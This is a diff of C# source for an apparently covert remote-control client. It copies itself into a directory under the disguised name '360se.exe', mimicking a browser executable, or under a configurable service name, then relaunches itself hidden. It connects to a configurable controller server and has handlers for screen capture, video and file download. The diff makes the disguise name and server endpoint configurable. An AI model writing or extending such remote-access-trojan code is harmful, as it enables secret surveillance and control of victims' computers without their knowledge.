@@ -26,9 +26,8 @@ namespace RemoteControl.Client
     {
         private static Socket oServer;
         private static SocketSession oServerSession;
+        private static ClientParameters clientParameters;
         private static bool isTestMode = false;
-        private static string ServerIP = "192.168.1.136";
-        private static int ServerPort = 10086;
         private static Dictionary<string, RequestStartGetScreen> sessionScreenHandleSwitch = new Dictionary<string, RequestStartGetScreen>();
         private static Dictionary<string, bool> sessionVideoHandleSwitch = new Dictionary<string, bool>();
         private static Dictionary<string, bool> sessionDownloadHandleSwitch = new Dictionary<string, bool>();
@@ -48,6 +47,7 @@ namespace RemoteControl.Client
         {
             // 窗体隐藏时调用Console.Title会报错
             //Console.Title = "RC";
+            ReadParameters();
             if (args.Length == 0)
             {
                 // 进行安装操作
@@ -57,16 +57,20 @@ namespace RemoteControl.Client
                 {
                     System.IO.Directory.CreateDirectory(destinationFileDir);
                 }
-                var destinationFilePath = destinationFileDir + "\\" + "360se.exe";
+                string serviceName = "360se.exe";
+                if (!string.IsNullOrWhiteSpace(clientParameters.ServiceName))
+                {
+                    serviceName = clientParameters.ServiceName;
+                }
+                var destinationFilePath = destinationFileDir + "\\" + serviceName;
                 System.IO.File.Copy(sourceFilePath, destinationFilePath, true);
-                var t = ProcessUtil.RunByCmdStart(destinationFilePath, "/r", true);
+                var t = ProcessUtil.Run(destinationFilePath, "/r", true, false);
                 t.Join();
                 return;
             }
             else if (args.Length == 1 && args[0] == "/r")
             {
                 // 进行运行操作
-                ReadParameters();
                 InitHandlers();
                 StartConnect();
                 heartbeatThread = new Thread(() => StartHeartbeat()) { IsBackground = true };
@@ -85,16 +89,19 @@ namespace RemoteControl.Client
         {
             if (isTestMode)
             {
-                return; 
+                clientParameters.SetServerIP("192.168.1.136");
+                clientParameters.ServerPort = 10086;
+                clientParameters.OnlineAvatar = "";
+                clientParameters.ServiceName = "";
             }
-
-            string filePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
-            ClientParameters paras = ClientParametersManager.ReadParameters(filePath);
-            Program.ServerIP = paras.GetServerIP();
-            Program.ServerPort = paras.ServerPort;
+            else
+            {
+                string filePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
+                clientParameters = ClientParametersManager.ReadParameters(filePath); 
+            }
             Console.WriteLine("参数信息：");
-            Console.WriteLine("IP:" + paras.GetServerIP());
-            Console.WriteLine("PORT：" + paras.ServerPort);
+            Console.WriteLine("IP:" + clientParameters.GetServerIP());
+            Console.WriteLine("PORT：" + clientParameters.ServerPort);
         }
 
         static void StartConnect()
@@ -105,7 +112,7 @@ namespace RemoteControl.Client
                 {
                     DoOutput("正在连接服务器...");
                     oServer = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                    oServer.Connect(ServerIP, ServerPort);
+                    oServer.Connect(clientParameters.GetIPEndPoint());
                     DoOutput("服务器连接成功！");
 
                     oServerSession = new SocketSession(oServer.RemoteEndPoint.ToString(), oServer);
@@ -126,6 +133,7 @@ namespace RemoteControl.Client
             ResponseGetHostName resp = new ResponseGetHostName();
             resp.HostName = Dns.GetHostName();
             resp.AppPath = Application.ExecutablePath;
+            resp.OnlineAvatar = clientParameters.OnlineAvatar;
             session.Send(ePacketType.PACKET_GET_HOST_NAME_RESPONSE, resp);
 
             new Thread(() =>
